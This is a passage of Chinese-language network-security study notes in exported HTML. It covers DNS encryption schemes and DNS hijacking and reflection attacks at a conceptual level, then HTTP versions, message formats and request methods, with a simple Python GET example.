域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。</span></p></blockquote><h4 id='dns-隧道-1'><span>DNS 隧道</span></h4><blockquote><p><span>DNS 隧道工具将进入隧道的其他协议流量封装到 DNS 协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。</span></p></blockquote><h3 id='267--加密方案'><span>2.6.7  加密方案</span></h3><blockquote><p><span>作为主流的防御方案，DNS 加密有五种方案，分别是 DNS-over-TLS (DoT)、DNS-over-DTLS、DNS-over- HTTPS (DoH)、DNS-over-QUIC 以及 DNSCrypt。</span></p></blockquote><h4 id='dot'><span>DoT</span></h4><blockquote><p><span>DoT 方案在 2016 年发表于 RFC7858，使用 853 端口。主要思想是 Client 和 Server 通过 TCP 协议建立</span></p><p><span>TLS 会话后再进行 DNS 传输，Client 通过 SSL 证书验证服务器身份。</span></p></blockquote><h4 id='dns-over-dtls'><span>DNS-over-DTLS</span></h4><blockquote><p><span>DNS-over-DTLS 和 DoT 类似，区别在于使用 UDP 协议而不是 TCP 协议。</span></p></blockquote><h4 id='doh'><span>DoH</span></h4><blockquote><p><span>DoH 方案在发表 RFC8484，使用 </span><a href='https://dns.example.com/dns-query' target='_blank' class='url'>https://dns.example.com/dns-query</a><span>{?dns} 来查询服务器的 IP，复用 https 的 443 端口，流量特征比较小。DoH 会对 DNS 服务器进行加密认证，不提供 fallback 选项。目前 Cloudflare、Google 等服务商对 DoH 提供了支持。</span></p></blockquote><h4 id='dns-over-quic'><span>DNS-over-QUIC</span></h4><blockquote><p><span>DNS-over-QUIC 安全特性和 DoT 类似，但是性能更高，目前没有合适的软件实现。</span></p></blockquote><h4 id='dnscrypt'><span>DNSCrypt</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>DNSCrypt 使用 X25519-XSalsa20Poly1305 而非标准的 TLS， DNSCrypt 的 Client 需要额外的软件，</span></p><p><span>Server 需要的专门的证书。</span></p></blockquote><h3 id='268--相关漏洞'><span>2.6.8  相关漏洞</span></h3><h4 id='dns-劫持'><span>DNS 劫持</span></h4><blockquote><p><span>DNS 劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造 DNS 响应的方法，来将域名解析到恶意的 IP 地址。</span></p><p><span>随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。</span></p></blockquote><h4 id='拒绝服务-1'><span>拒绝服务</span></h4><blockquote><p><span>DNS 服务通常会开启 UDP 端口，当 DNS 服务器拥有大量二级域 NS 记录时，通过 DNS 的 UDP 反射攻击可以实现高倍的拒绝服务。</span></p></blockquote><h3 id='269--参考链接'><span>2.6.9  参考链接</span></h3><h4 id='rfc-2'><span>RFC</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc1034'><span>RFC 1034 DOMAIN NAMES CONCEPTS AND FACILITIES</span></a></li><li><a href='https://tools.ietf.org/html/rfc1035'><span>RFC 1035 DOMAIN NAMES IMPLEMENTATION AND SPECIFICATION</span></a></li><li><a href='https://tools.ietf.org/html/rfc1123'><span>RFC 1123 Requirements for Internet Hosts </span>–<span> Application and Support</span></a></li><li><a href='https://tools.ietf.org/html/rfc2535'><span>RFC 2535 Domain Name System Security Extensions</span></a></li><li><a href='https://tools.ietf.org/html/rfc2930'><span>RFC 2930 Secret Key Establishment for DNS (TKEY RR)</span></a></li><li><a href='https://tools.ietf.org/html/rfc2931'><span>RFC 2931 DNS Request and Transaction Signatures ( SIG(0)s )</span></a></li><li><a href='https://tools.ietf.org/html/rfc3596'><span>RFC 3596 Legacy Resolver Compatibility for Delegation Signer (DS)</span></a></li><li><a href='https://tools.ietf.org/html/rfc3755'><span>RFC 3755 DNS Extensions to Support IP Version 6</span></a></li><li><a href='https://tools.ietf.org/html/rfc5001'><span>RFC 5001 Automated Updates of DNS Security (DNSSEC) Trust Anchors</span></a></li><li><a href='https://tools.ietf.org/html/rfc5936'><span>RFC 5936 DNS Zone Transfer Protocol</span></a></li><li><a href='https://tools.ietf.org/html/rfc5966'><span>RFC 5966 DNS Transport over TCP - Implementation Requirements</span></a></li><li><a href='https://tools.ietf.org/html/rfc6376'><span>RFC 6376 DomainKeys Identified Mail (DKIM) Signatures</span></a></li><li><a href='https://tools.ietf.org/html/rfc6762'><span>RFC 6762 Multicast DNS</span></a></li><li><a href='https://tools.ietf.org/html/rfc6891'><span>RFC 6891 Extension Mechanisms for DNS (EDNS(0))</span></a></li><li><a href='https://tools.ietf.org/html/rfc6895'><span>RFC 6895 DNS IANA Considerations</span></a></li><li><a href='https://tools.ietf.org/html/rfc7766'><span>RFC 7766 DNS Transport over TCP - Implementation Requirements</span></a></li><li><a href='https://tools.ietf.org/html/rfc7858'><span>RFC 7858 Specification for DNS over Transport Layer Security (TLS)</span></a></li><li><a href='https://tools.ietf.org/html/rfc8082'><span>RFC 8082 NXDOMAIN</span></a></li><li><a href='https://tools.ietf.org/html/rfc8482'><span>RFC 8482 Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY</span></a></li><li><a href='https://tools.ietf.org/html/rfc8484'><span>RFC 8484 DNS Queries over HTTPS (DoH)</span></a></li><li><a href='https://tools.ietf.org/html/rfc8490'><span>RFC 8490 DNS Stateful Operations</span></a></li><li><a href='https://tools.ietf.org/html/rfc8499'><span>RFC 8499 DNS Terminology</span></a></li></ul><h4 id='工具'><span>工具</span></h4><ul><li><a href='https://github.com/NLnetLabs/unbound'><span>Unbound</span></a></li><li><a href='https://github.com/isc-projects/bind9'><span>bind9</span></a></li></ul><h4 id='研究文章-1'><span>研究文章</span></h4><ul><li><a href='https://mp.weixin.qq.com/s/xbf0Qbppk8R0nx89Pb4YTg'><span>DGA 域名的今生前世：缘起、检测、与发展</span></a></li><li><a href='https://blog.thecjw.me/?p=1221'><span>DNSSEC 原理和分析</span></a></li><li><span>Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware</span><span>[</span><span>C</span><span>]</span><span>//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.</span></li><li><span>An End-to-End Large-Scale Measurement of DNS-over-Encryption: How Far Have We Come?</span></li></ul><h4 id='相关-cve-1'><span>相关 CVE</span></h4><ul><li><a href='https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/'><span>SIGRed </span>–<span> Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS</span></a><span> </span><a href='https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/'><span>Servers</span></a></li></ul><p>&nbsp;</p><h2 id='27--http-协议簇'><span>2.7  HTTP 协议簇</span></h2><h3 id='271--http'><span>2.7.1  HTTP</span></h3><h4 id='http-协议简介'><span>HTTP 协议简介</span></h4><p><span>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议，是一个基于TCP/IP通信协议来传递数据（HTML文件, 图片文件, 查询结果等）。</span></p><h4 id='http-版本'><span>HTTP 版本</span></h4><h5 id='http-09'><span>HTTP 0.9</span></h5><blockquote><p><span>HTTP 0.9 最早在 1991 年发布，仅支持 GET 命令，请求格式只有简单的 GET /url ，服务端仅响应 HTML，响应完毕后关闭 TCP 连接。</span></p></blockquote><h5 id='http-10'><span>HTTP 1.0</span></h5><blockquote><p><span>1996 年 5 月，HTTP/1.0 版本发布，丰富了传输的格式和内容，还引入了 POST、HEAD 两个动词。从 1.0开始，必须在尾部添加协议版本。在 1.0 中，也引入了状态码 (status code)、多字符集支持、多部分发送 (multi-part type)、权限 (authorization)、缓存 (cache)、内容编码 (content encoding) 等内容。</span></p><p><span>HTTP 1.0 版的</span><strong><span>主要缺点</span></strong><span>是，每个 TCP 连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。</span></p><p><span>TCP 连接的新建成本很高，因为需要客户端和服务器三次握手，开始时发送速率较慢 (slow start)，所以，HTTP 1.0 版本的性能比较差。</span></p></blockquote><h5 id='http-11'><span>HTTP 1.1</span></h5><blockquote><p><span>1997 年 1 月，HTTP/1.1 版本发布，进一步完善了 HTTP 协议。1.1 版本主要是引入了持久连接、管道机制、Content-Length、分块传输编码等内容。管道机制即在同一个 TCP 连接里面，客户端可以同时发送多个请求，这样就改进了 HTTP 协议的效率。PUT、PATCH、HEAD、OPTIONS、DELETE 等动词方法也是在 HTTP 1.1 版本引入的。另外 1.1 版本新增了 Host 字段，用于指定服务器的域名，这也是后来虚拟主机得以发展的基础。</span></p><p><span>虽然 1.1 版允许复用 TCP 连接，但是同一个 TCP 连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。如果有一个请求很慢，就会阻塞后面的请求。</span></p></blockquote><h5 id='spdy'><span>SPDY</span></h5><blockquote><p><span>2009 年，谷歌公开了自行研发的 SPDY 协议，用于解决 HTTP/1.1 效率不高的问题，而后被当做 HTTP/2</span></p><p><span>的基础。</span></p></blockquote><h5 id='http2'><span>HTTP/2</span></h5><blockquote><p><span>2015 年，HTTP/2 发布，HTTP/2 是一个二进制协议，头信息和数据体都是二进制，统称为</span><strong><span>帧 (frame)</span></strong><span>，帧分为头信息帧和数据帧。HTTP/2 复用 TCP 连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而 不用按照顺序回应。</span></p></blockquote><h4 id='http-工作原理'><span>HTTP 工作原理</span></h4><p><span>HTTP协议工作于C/S（客户端-服务端）架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</span></p><p><span>Web服务器有：Nginx服务器，Apache服务器，IIS服务器（Internet Information Services）等。</span></p><p><span>Web服务器根据接收到的请求后，向客户端发送响应信息。</span></p><p><span>HTTP默认端口号为80，你也可以改为8080或者其他端口，HTTPS默认端口号为443。</span></p><h4 id='http注意事项'><span>HTTP注意事项</span></h4><ul><li><span>HTTP是无连接：无连接指限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</span></li><li><span>HTTP是媒体独立的：这意味着，只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。</span></li><li><span>HTTP是无状态：HTTP协议是无状态协议。无状态指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</span></li></ul><p><span>HTTP协议通信流程图：</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173339825.png" referrerpolicy="no-referrer" alt="image-20220508173339825"></p><h4 id='http-消息结构'><span>HTTP 消息结构 </span></h4><p><span>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。</span></p><h4 id='客户端请求消息'><span>客户端请求消息</span></h4><p><span>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</span></p><p><span>请求报文的一般格式图：</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173554176.png" referrerpolicy="no-referrer" alt="image-20220508173554176"></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173719525.png" referrerpolicy="no-referrer" alt="image-20220508173719525"></p><p><span>注意：在http请求报文中，GET之后是有一个空格的</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">method</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">request-URL</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">version</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">headers</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">entity-body</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='服务器响应消息'><span>服务器响应消息 </span></h4><p><span>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</span></p><p><span>响应报文格式：</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173934571.png" referrerpolicy="no-referrer" alt="image-20220508173934571"></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">version</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">status</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">reason-phrase</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">headers</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">entity-body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h5 id='实例用python代码来实现）'><span>实例（用Python代码来实现）：</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>9</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">urllib</span>.<span class="cm-property">request</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">url</span> = <span class="cm-string">"http://httpbin.org/get"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">print</span>(<span class="cm-variable">url</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># 添加请求的url和方法</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">req</span> = <span class="cm-variable">urllib</span>.<span class="cm-property">request</span>.<span class="cm-property">Request</span>(<span class="cm-variable">url</span>, <span class="cm-variable">method</span>=<span class="cm-string">"GET"</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># 接收响应数据</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">returnData</span> = <span class="cm-variable">urllib</span>.<span class="cm-property">request</span>.<span class="cm-property">urlopen</span>(<span class="cm-variable">req</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">res_json</span> = <span class="cm-variable">returnData</span>.<span class="cm-property">read</span>().<span class="cm-property">decode</span>(<span class="cm-string">'utf-8'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">print</span>(<span class="cm-variable">res_json</span>)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508175357317.png" referrerpolicy="no-referrer" alt="image-20220508175357317"></p><h4 id='字段解释'><span>字段解释</span></h4><h5 id='method请求方法）'><span>method（请求方法）</span></h5><ul><li><p><span>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。</span></p></li><li><p><span>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</span></p><figure><table><thead><tr><th><span>序号</span></th><th><span>方法</span></th><th><span>用途</span></th></tr></thead><tbody><tr><td><span>1</span></td><td><span>GET</span></td><td><span>请求指定的页面信息，并返回实体主体。</span></td></tr><tr><td><span>2</span></td><td><span>HEAD</span></td><td><span>类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</span></td></tr><tr><td><span>3</span></td><td><span>POST</span></td><td><span>向指定资源提交数据进行处理请求（例如，提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立或已有资源的修改。</span></td></tr><tr><td><span>4</span></td><td><span>PUT</span></td><td><span>从客户端向服务器传送的数据取代指定的文档的内容。</span></td></tr><tr><td><span>5</span></td><td><span>DELETE</span></td><td><span>请求服务器删除指定的页面。</span></td></tr><tr><td><span>6</span></td><td><span>CONNECT</span></td><td><span>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</span></td></tr><tr><td><span>7</span></td><td><span>OPTIONS</span></td><td><span>允许客户端查看服务器的性能。</span></td></tr><tr><td><span>8</span></td><td><span>TRACE</span></td><td><span>回显服务器收到的请求，主要用于测试或诊断。</span></td></tr><tr><td><span>9</span></td><td><span>PATCH</span></td><td><span>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</span></td></tr></tbody></table></figure></li><li><p><span>GET和POST的区别</span></p><ul><li><span>GET在浏览器回退时是无害的，而POST会再次提交请求。</span></li><li><span>GET产生的URL地址可以被Bookmark，而POST不可以。</span></li><li><span>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</span></li><li><span>GET请求只能进行url编码，而POST支持多种编码方式。</span></li><li><span>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</span></li><li><span>GET请求在URL中传送的参数是有长度限制的，而POST没有。</span></li><li><span>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</span></li><li><span>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</span></li><li><span>GET参数通过URL传递，POST放在Request body中。</span></li></ul></li></ul><p><span>HTTP的底层是TCP/IP（推荐书籍《TCP/IP详解》）。所以，GET和POST的底层也是TCP/IP。GET和POST能做的事情是一样一样的。如果给GET加上request body，或者给POST带上url参数，技术上是完全行的通的。也就是说，</span><strong><span>GET和POST在本质上没什么区别</span></strong><span>。</span></p><p><span>但是如果真的一点区别都没有，那么这个问题也就不存在了，两者之间最重大的区别就是：</span><strong><span>GET产生一个TCP数据包；POST产生两个TCP数据包。</span></strong>
<span>具体点说来就是：对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</span></p><p><span>get: </span><a href='http://tools.ietf.org/html/rfc2616#section-9.3'><span>RFC 2616 - Hypertext Transfer Protocol </span>–<span> HTTP/1.1</span></a><span> </span></p><p><span>post: </span><a href='http://tools.ietf.org/html/rfc2616#section-9.5'><span>RFC 2616 - Hypertext Transfer Protocol </span>–<span> HTTP/1.1</span></a></p><h5 id='version-1'><span>version</span></h5><ul><li><span>报文使用的 HTTP 版本</span></li><li><span>格式为 HTTP/</span><span>&lt;</span><span>major</span><span>&gt;</span><span>.</span><span>&lt;</span><span>minor</span><span>&gt;</span></li></ul><h5 id='url-详解）'><span>url （详解）</span></h5><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[协议类型]://[用户名[:密码]]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; 